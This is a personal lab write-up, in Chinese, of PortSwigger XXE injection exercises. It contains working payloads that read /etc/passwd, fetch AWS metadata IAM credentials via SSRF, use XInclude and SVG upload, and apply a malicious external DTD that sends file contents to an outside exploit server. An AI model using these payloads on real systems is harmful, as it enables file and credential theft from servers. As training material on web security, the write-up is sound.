---
title: PortSwigger XML external entity (XXE) injection
description: PortSwigger XML external entity (XXE) injection
---

## Lab: Exploiting XXE using external entities to retrieve files

| Dimension | Description                                                                   |
| --------- | ----------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files     |
| Lab       | https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files |

先看一下正常的 XML Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>2</productId>
  <storeId>1</storeId>
</stockCheck>
```

替換成

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <storeId>1</storeId>
    <productId>&xxe;</productId>
</stockCheck>
```

## Lab: Exploiting XXE to perform SSRF attacks

| Dimension | Description                                                                     |
| --------- | ------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks |
| Lab       | https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf     |

這題要用 SSRF 去偷 AWS EC2 Metadata `http://169.254.169.254/`，但我之前沒用 EC2 戳過，所以不知道格式是什麼

總之這個 Endpoint 回傳的資料格式有點類似 Directory Listing 的結果，沒有任何點綴，單純就是字串用 `\n` 切開，例如

```
hello
world
```

所以我們要順著這個目錄一層一層往下移動，最後成功構造

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

## Lab: Exploiting XInclude to retrieve files

| Dimension | Description                                                  |
| --------- | ------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/xxe#xinclude-attacks    |
| Lab       | https://portswigger.net/web-security/xxe/lab-xinclude-attack |

這題簡單到我還沒意識到就通關了

```js
fetch(
  "https://0a95003503688eab825c4374001800ee.web-security-academy.net/product/stock",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

不過我很想吐槽的是，這根本是盲注（？誰會知道 API 的 productId 欄位會在 Backend 被轉成 XML，這比 SQLi 還不直覺啊（？也有可能是我太菜...

## Lab: Exploiting XXE via image file upload

| Dimension | Description                                                          |
| --------- | -------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe#xxe-attacks-via-file-upload |
| Lab       | https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload     |

這題利用 Server 的 XML Parser，會把圖片轉成 PNG，記得要讓 `<text>` 在 `<svg>` 的 `viewBox` 內，並且文字要盡可能的大一點，因為這題的 Server 把圖片轉成 PNG 以後會變超模糊，所以文字太小會看不到

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="200" viewBox="0 0 500 200">
    <text x="10" y="50" font-size="50" fill="black">&xxe;</text>
</svg>
```

之前確實有遇過，不管上傳什麼格式的圖片，都會統一轉成 PNG 的 Parser，但以前沒有這個攻擊手法，不知道原來 XML 跟 SVG 還能這樣搭配使用，真酷

## Lab: Blind XXE with out-of-band interaction

| Dimension | Description                                                                                          |
| --------- | ---------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe/blind#detecting-blind-xxe-using-out-of-band-oast-techniques |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction                  |

<!-- todo-yusheng -->

這題需要 Burp Suite Professional，之後再來解～

## Lab: Blind XXE with out-of-band interaction via XML parameter entities

| Dimension | Description                                                                                                  |
| --------- | ------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/xxe/blind#detecting-blind-xxe-using-out-of-band-oast-techniques         |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities |

<!-- todo-yusheng -->

這題需要 Burp Suite Professional，之後再來解～

## Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

| Dimension | Description                                                                                        |
| --------- | -------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration               |

<!-- todo-yusheng -->

這題需要 Burp Suite Professional，之後再來解～

## Lab: Exploiting blind XXE to retrieve data via error messages

| Dimension | Description                                                                                             |
| --------- | ------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages           |

嘗試

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
<stockCheck><productId>%eval;</productId><storeId>%error;</storeId></stockCheck>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
]>
<stockCheck>
    <productId>%eval;</productId>
    <storeId>%error;</storeId>
</stockCheck>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
    %hello;
    %world;
]>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
    %hello;
]>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % hello "<!ENTITY &#x25; world SYSTEM 'file:///nonexistent/%file;'>">
]>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % hello "<!ENTITY &#x25;>">
]>
```

=> `"Entities are not allowed for security reasons"`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
]>
```

=> `"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 4; columnNumber: 3; Premature end of file."`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    %file;
]>
```

=> `"XML parser exited with error: org.xml.sax.SAXParseException; systemId: file:///etc/passwd; lineNumber: 1; columnNumber: 1; The markup declarations contained or pointed to by the document type declaration must be well-formed."`

在 exploit-server 定義

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0af6007c0389b3028050c0f0014900f4.exploit-server.net/?%file;'>">
%eval;
%exfil;
```

Client 端

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % dtd SYSTEM "https://exploit-0af6007c0389b3028050c0f0014900f4.exploit-server.net/exploit">
    %dtd;
]>
```

=> `"XML parser exited with error: java.net.MalformedURLException: Illegal character in URL"`

感覺快成功了，回到題目本身，是說要用 error message，所以修改 exploit-server 的 body

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%exfil;
```

## Lab: Exploiting XXE to retrieve data by repurposing a local DTD

| Dimension | Description                                                                                           |
| --------- | ----------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-by-repurposing-a-local-dtd        |
| Lab       | https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd |

## 名詞介紹

## 參考資料

- https://portswigger.net/web-security/xxe
